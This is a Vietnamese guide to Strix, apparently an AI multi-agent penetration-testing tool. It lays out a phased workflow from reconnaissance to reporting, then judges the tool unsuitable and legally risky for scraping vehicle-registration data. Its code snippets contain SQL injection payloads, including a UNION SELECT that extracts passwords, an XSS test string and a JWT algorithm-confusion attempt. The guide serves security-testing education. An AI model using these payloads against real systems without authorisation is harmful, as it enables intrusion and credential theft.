# 🔄 QUY TRÌNH KẾT HỢP TÍNH NĂNG STRIX

## Hướng Dẫn Xây Dựng Quy Trình Làm Việc Tích Hợp Toàn Bộ Tính Năng

**Ngày tạo:** 25/11/2025  
**Phiên bản:** 1.0

---

## 📑 MỤC LỤC

1. [Tổng Quan Tính Năng](#1-tổng-quan-tính-năng)
2. [Mối Quan Hệ Giữa Các Tính Năng](#2-mối-quan-hệ-giữa-các-tính-năng)
3. [Quy Trình Kết Hợp Hoàn Chỉnh](#3-quy-trình-kết-hợp-hoàn-chỉnh)
4. [Ví Dụ Thực Tế: Kiểm Tra Bảo Mật](#4-ví-dụ-thực-tế-kiểm-tra-bảo-mật)
5. [Đánh Giá Ứng Dụng Vào Bài Toán Đăng Kiểm](#5-đánh-giá-ứng-dụng-vào-bài-toán-đăng-kiểm)

---

## 1. TỔNG QUAN TÍNH NĂNG

### 1.1 Bảng Tổng Hợp 8 Tính Năng Chính

| # | Tính Năng | File Mã Nguồn | Mục Đích Chính |
|---|-----------|---------------|----------------|
| 1 | **Browser Automation** | `tools/browser/` | Tự động hóa trình duyệt web |
| 2 | **HTTP Proxy** | `tools/proxy/` | Chặn và phân tích HTTP traffic |
| 3 | **Terminal Execution** | `tools/terminal/` | Chạy lệnh shell trong Kali Linux |
| 4 | **Python Runtime** | `tools/python/` | Chạy code Python tùy chỉnh |
| 5 | **Web Search** | `tools/web_search/` | Tìm kiếm thông tin bảo mật |
| 6 | **Notes Management** | `tools/notes/` | Quản lý ghi chú và phát hiện |
| 7 | **Vulnerability Reporting** | `tools/reporting/` | Tạo báo cáo lỗ hổng |
| 8 | **Multi-Agent System** | `tools/agents_graph/` | Điều phối nhiều agents |

### 1.2 Chi Tiết Từng Tính Năng

#### 🌐 1. Browser Automation

**Khả năng:**
- Khởi động và điều khiển trình duyệt Chromium
- Điều hướng, click, nhập văn bản
- Chạy JavaScript, chụp screenshot
- Quản lý nhiều tabs

**Hành động có sẵn (từ mã nguồn):**
```python
BrowserAction = Literal[
    "launch", "goto", "click", "type",
    "scroll_down", "scroll_up", "back", "forward",
    "new_tab", "switch_tab", "close_tab",
    "wait", "execute_js", "double_click", "hover",
    "press_key", "save_pdf", "get_console_logs",
    "view_source", "close", "list_tabs"
]
```

#### 🔒 2. HTTP Proxy (Caido Integration)

**Khả năng:**
- Capture tất cả HTTP/HTTPS requests
- Phân tích request/response headers và body
- Replay và modify requests
- Tìm kiếm theo nhiều tiêu chí

#### 💻 3. Terminal Execution

**Khả năng:**
- Chạy bất kỳ lệnh shell nào
- Sử dụng công cụ Kali Linux
- Quản lý nhiều terminal sessions
- Timeout và input control

#### 🐍 4. Python Runtime

**Khả năng:**
- Tạo và quản lý Python sessions
- Chạy code Python tùy ý
- Sử dụng các thư viện bảo mật
- Phát triển PoC exploits

#### 🔍 5. Web Search

**Khả năng:**
- Tìm kiếm thông tin CVE
- Nghiên cứu kỹ thuật mới
- Tìm exploit và PoC
- Sử dụng Perplexity AI

#### 📝 6. Notes Management

**Categories hỗ trợ:**
- `general` - Ghi chú chung
- `findings` - Phát hiện lỗ hổng
- `methodology` - Phương pháp
- `todo` - Việc cần làm
- `questions` - Câu hỏi
- `plan` - Kế hoạch

#### 📊 7. Vulnerability Reporting

**Mức độ nghiêm trọng:**
- `critical` - CVSS 9.0-10.0
- `high` - CVSS 7.0-8.9
- `medium` - CVSS 4.0-6.9
- `low` - CVSS 0.1-3.9
- `info` - Thông tin

#### 🤖 8. Multi-Agent System

**Khả năng:**
- Tạo sub-agents chuyên biệt
- Phân chia công việc song song
- Giao tiếp giữa các agents
- Tổng hợp kết quả

---

## 2. MỐI QUAN HỆ GIỮA CÁC TÍNH NĂNG

### 2.1 Sơ Đồ Kết Nối

```
┌─────────────────────────────────────────────────────────────────┐
│                     MULTI-AGENT SYSTEM                          │
│                    (Điều phối trung tâm)                        │
└─────────────────────────────────────────────────────────────────┘
         │                    │                    │
         ▼                    ▼                    ▼
┌─────────────┐      ┌─────────────┐      ┌─────────────┐
│  Agent #1   │      │  Agent #2   │      │  Agent #3   │
│   (SQLi)    │      │   (XSS)     │      │   (IDOR)    │
└─────────────┘      └─────────────┘      └─────────────┘
         │                    │                    │
         └────────────────────┼────────────────────┘
                              │
         ┌────────────────────┼────────────────────┐
         │                    │                    │
         ▼                    ▼                    ▼
┌─────────────────┐  ┌─────────────────┐  ┌─────────────────┐
│    BROWSER      │  │   HTTP PROXY    │  │    TERMINAL     │
│   AUTOMATION    │  │   (Caido)       │  │   EXECUTION     │
│                 │  │                 │  │                 │
│ • Điều hướng    │  │ • Capture       │  │ • Nmap          │
│ • Click/Type    │  │ • Analyze       │  │ • SQLMap        │
│ • Execute JS    │  │ • Replay        │  │ • Gobuster      │
└─────────────────┘  └─────────────────┘  └─────────────────┘
         │                    │                    │
         └────────────────────┼────────────────────┘
                              │
                              ▼
                 ┌─────────────────────────┐
                 │     PYTHON RUNTIME      │
                 │                         │
                 │  • Parse responses      │
                 │  • Develop PoCs         │
                 │  • Data processing      │
                 └─────────────────────────┘
                              │
         ┌────────────────────┼────────────────────┐
         │                    │                    │
         ▼                    ▼                    ▼
┌─────────────────┐  ┌─────────────────┐  ┌─────────────────┐
│   WEB SEARCH    │  │     NOTES       │  │   REPORTING     │
│                 │  │   MANAGEMENT    │  │                 │
│ • Tìm CVE       │  │ • Lưu findings  │  │ • Tạo báo cáo   │
│ • Tìm exploit   │  │ • Track todos   │  │ • Severity      │
└─────────────────┘  └─────────────────┘  └─────────────────┘
```

### 2.2 Ma Trận Tương Tác

| Tính Năng | Browser | Proxy | Terminal | Python | Search | Notes | Report | Multi-Agent |
|-----------|---------|-------|----------|--------|--------|-------|--------|-------------|
| **Browser** | - | ✅ Capture | - | ✅ Parse | - | ✅ Log | ✅ Evidence | ✅ Parallel |
| **Proxy** | ✅ Traffic | - | - | ✅ Analyze | - | ✅ Log | ✅ Evidence | ✅ Parallel |
| **Terminal** | - | - | - | ✅ Process | - | ✅ Log | ✅ Evidence | ✅ Parallel |
| **Python** | ✅ Control | ✅ Request | ✅ Execute | - | - | ✅ Store | ✅ Generate | ✅ Parallel |
| **Search** | - | - | - | - | - | ✅ Log | - | ✅ Parallel |
| **Notes** | - | - | - | ✅ Read | - | - | ✅ Input | ✅ Share |
| **Report** | ✅ Screenshot | ✅ Request | ✅ Output | ✅ Data | ✅ Info | ✅ Content | - | ✅ Aggregate |
| **Multi-Agent** | ✅ Delegate | ✅ Delegate | ✅ Delegate | ✅ Delegate | ✅ Delegate | ✅ Share | ✅ Combine | - |

---

## 3. QUY TRÌNH KẾT HỢP HOÀN CHỈNH

### 3.1 Giai Đoạn 1: Khởi Tạo & Lập Kế Hoạch

```python
# Multi-Agent khởi tạo và phân chia công việc

# 1. Root Agent phân tích scope
create_note(
    title="Penetration Test Plan",
    content="Target: example.com\nScope: Web app + API",
    category="plan"
)

# 2. Tìm kiếm thông tin về target
web_search(query="example.com technology stack vulnerabilities")

# 3. Tạo các sub-agents chuyên biệt
create_agent(name="Recon_Agent", task="Reconnaissance")
create_agent(name="SQLi_Agent", task="SQL Injection testing")
create_agent(name="XSS_Agent", task="XSS testing")
create_agent(name="Auth_Agent", task="Authentication testing")
```

### 3.2 Giai Đoạn 2: Thu Thập Thông Tin (Reconnaissance)

```python
# Recon_Agent thực hiện

# 1. Quét port với Terminal
terminal_execute(command="nmap -sV -sC target.example.com")

# 2. Tìm subdomain
terminal_execute(command="subfinder -d example.com")

# 3. Enum directories
terminal_execute(command="gobuster dir -u https://example.com -w /wordlists/common.txt")

# 4. Khởi động Browser để khám phá
browser_action(action="launch")
browser_action(action="goto", url="https://example.com")

# 5. Capture traffic với Proxy
# (Tự động bởi Caido integration)

# 6. Ghi chú findings
create_note(
    title="Recon Results",
    content="Open ports: 80, 443, 8080\nSubdomains: api.example.com",
    category="findings"
)
```

### 3.3 Giai Đoạn 3: Quét Lỗ Hổng (Scanning)

```python
# SQLi_Agent, XSS_Agent, Auth_Agent chạy song song

# === SQLi_Agent ===
# 1. Phân tích requests từ Proxy
requests = list_requests(httpql_filter="path contains '/api/'")

# 2. Test SQLi với Python
python_action(
    action="execute",
    code="""
import requests
payloads = ["' OR '1'='1", "1' ORDER BY 1--"]
for payload in payloads:
    resp = requests.get(f"https://api.example.com/search?q={payload}")
    print(f"Payload: {payload}, Status: {resp.status_code}")
"""
)

# === XSS_Agent ===
# 1. Tìm input fields với Browser
browser_action(action="goto", url="https://example.com/feedback")
browser_action(action="type", text="<script>alert(1)</script>")
browser_action(action="click", coordinate="400,500")

# 2. Kiểm tra console logs
logs = browser_action(action="get_console_logs")

# === Auth_Agent ===
# 1. Test JWT vulnerabilities
python_action(
    action="execute",
    code="""
import jwt
# Test algorithm confusion
token = jwt.encode({"user": "admin"}, "public_key", algorithm="HS256")
"""
)
```

### 3.4 Giai Đoạn 4: Khai Thác & Xác Thực (Exploitation)

```python
# Xác nhận lỗ hổng bằng PoC

# 1. Tìm kiếm exploit đã biết
web_search(query="CVE-2024-XXXX exploit POC")

# 2. Phát triển PoC với Python
python_action(
    action="execute",
    code="""
# Custom exploit for confirmed SQLi
import requests
url = "https://api.example.com/users"
payload = "' UNION SELECT username, password FROM users--"
response = requests.get(url, params={"id": payload})
print("Extracted data:", response.text)
"""
)

# 3. Capture screenshot làm bằng chứng
browser_action(action="save_pdf", file_path="/workspace/evidence_sqli.pdf")

# 4. Ghi chú chi tiết
create_note(
    title="Confirmed SQLi in /api/users",
    content="Type: UNION-based\nParameter: id\nImpact: Data extraction",
    category="findings",
    tags=["sqli", "critical"],
    priority="urgent"
)
```

### 3.5 Giai Đoạn 5: Báo Cáo (Reporting)

```python
# Tổng hợp và tạo báo cáo

# 1. Liệt kê tất cả findings
findings = list_notes(category="findings")

# 2. Tạo vulnerability report cho từng lỗ hổng
create_vulnerability_report(
    title="SQL Injection in User API",
    content="""
## Mô Tả
UNION-based SQL Injection cho phép trích xuất dữ liệu người dùng.

## Bước Tái Hiện
1. Truy cập /api/users?id=1
2. Sửa parameter id thành: ' UNION SELECT username, password FROM users--
3. Quan sát response chứa dữ liệu nhạy cảm

## Impact
- Trích xuất toàn bộ database
- Credential theft
- Potential privilege escalation

## Khắc Phục
- Sử dụng parameterized queries
- Input validation
- Implement WAF rules
    """,
    severity="critical"
)

# 3. Agent điều phối tổng hợp từ sub-agents
send_message_to_agent(
    to_agent="Root_Agent",
    message="SQLi_Agent completed. Found 2 critical vulnerabilities."
)
```

---

## 4. VÍ DỤ THỰC TẾ: KIỂM TRA BẢO MẬT

### 4.1 Kịch Bản: Kiểm Tra Ứng Dụng E-Commerce

```bash
# Lệnh khởi chạy
strix --target https://shop.example.com \
      --instruction "Full security assessment focusing on payment, cart, and authentication"
```

### 4.2 Quy Trình Tự Động

```
Thời gian ước tính: 8-12 giờ

┌─────────────────────────────────────────────────────────────┐
│ Giờ 0-2: RECONNAISSANCE                                    │
├─────────────────────────────────────────────────────────────┤
│ • Terminal: nmap, subfinder, gobuster                       │
│ • Browser: Khám phá UI, chức năng                           │
│ • Proxy: Capture tất cả endpoints                           │
│ • Notes: Ghi nhận attack surface                            │
└─────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────┐
│ Giờ 2-6: VULNERABILITY SCANNING                             │
├─────────────────────────────────────────────────────────────┤
│ • Multi-Agent: 4 agents song song                           │
│   - Payment_Agent: Test payment flow                        │
│   - Cart_Agent: Test cart manipulation                      │
│   - Auth_Agent: Test authentication                         │
│   - API_Agent: Test API endpoints                           │
│ • Python: Custom payloads                                   │
│ • Web Search: CVE lookup                                    │
└─────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────┐
│ Giờ 6-10: EXPLOITATION & VALIDATION                         │
├─────────────────────────────────────────────────────────────┤
│ • Python: Develop PoCs                                      │
│ • Browser: Capture evidence                                 │
│ • Proxy: Replay attacks                                     │
│ • Notes: Document steps                                     │
└─────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────┐
│ Giờ 10-12: REPORTING                                        │
├─────────────────────────────────────────────────────────────┤
│ • Reporting: Create vulnerability reports                   │
│ • Multi-Agent: Aggregate results                            │
│ • Output: Final report with PoCs                            │
└─────────────────────────────────────────────────────────────┘
```

### 4.3 Kết Quả Mẫu

```json
{
  "scan_summary": {
    "target": "shop.example.com",
    "duration": "10h 23m",
    "endpoints_tested": 127,
    "vulnerabilities_found": 8
  },
  "vulnerabilities": [
    {
      "title": "Price Manipulation in Cart API",
      "severity": "critical",
      "type": "Business Logic",
      "poc_available": true
    },
    {
      "title": "Stored XSS in Product Reviews",
      "severity": "high",
      "type": "XSS",
      "poc_available": true
    },
    {
      "title": "IDOR in Order History",
      "severity": "high",
      "type": "Access Control",
      "poc_available": true
    }
  ]
}
```

---

## 5. ĐÁNH GIÁ ỨNG DỤNG VÀO BÀI TOÁN ĐĂNG KIỂM

### 5.1 Áp Dụng Quy Trình Vào Thu Thập Dữ Liệu Đăng Kiểm

| Giai Đoạn | Tính Năng | Khả Thi | Lý Do |
|-----------|-----------|---------|-------|
| Khởi tạo | Multi-Agent | ⚠️ Hạn chế | Không có task bảo mật |
| Reconnaissance | Terminal | ❌ Không | Không có API công khai |
| Reconnaissance | Web Search | ✅ Có | Tìm thông tin chung |
| Scanning | Browser | ❌ Không | CAPTCHA + chặn mạng |
| Scanning | Proxy | ❌ Không | Không có traffic |
| Exploitation | Python | ❌ Không | Không vượt được CAPTCHA |
| Reporting | Notes | ✅ Có | Lưu trữ kết quả thủ công |
| Reporting | Reporting | ⚠️ Hạn chế | Không phải vulnerability |

### 5.2 Kết Luận

**Strix KHÔNG phù hợp cho bài toán thu thập dữ liệu đăng kiểm vì:**

1. **Mục đích thiết kế khác nhau:**
   - Strix: Kiểm tra bảo mật ứng dụng
   - Yêu cầu: Thu thập dữ liệu

2. **Rào cản kỹ thuật:**
   - CAPTCHA trên các cổng tra cứu
   - Không có API công khai
   - Chặn truy cập từ cloud

3. **Rào cản pháp lý:**
   - Thông tin chủ xe không công khai
   - Vi phạm Nghị định 13/2023/NĐ-CP

### 5.3 Đề Xuất Thay Thế

| Mục Đích | Giải Pháp Phù Hợp |
|----------|-------------------|
| Thu thập dữ liệu đăng kiểm | Tra cứu thủ công trên cổng chính thức |
| Tự động hóa quy trình | Liên hệ Cục Đăng kiểm xin cấp phép API |
| Kiểm tra bảo mật ứng dụng | **SỬ DỤNG STRIX** ✅ |

---

> 📌 **Lưu ý quan trọng:**
> 
> Strix là công cụ mạnh mẽ cho kiểm tra bảo mật, nhưng việc sử dụng cho mục đích thu thập dữ liệu cá nhân là:
> - Không phù hợp về kỹ thuật
> - Có thể vi phạm pháp luật
> - Không được khuyến khích

---

*Tài liệu được tạo: 25/11/2025*
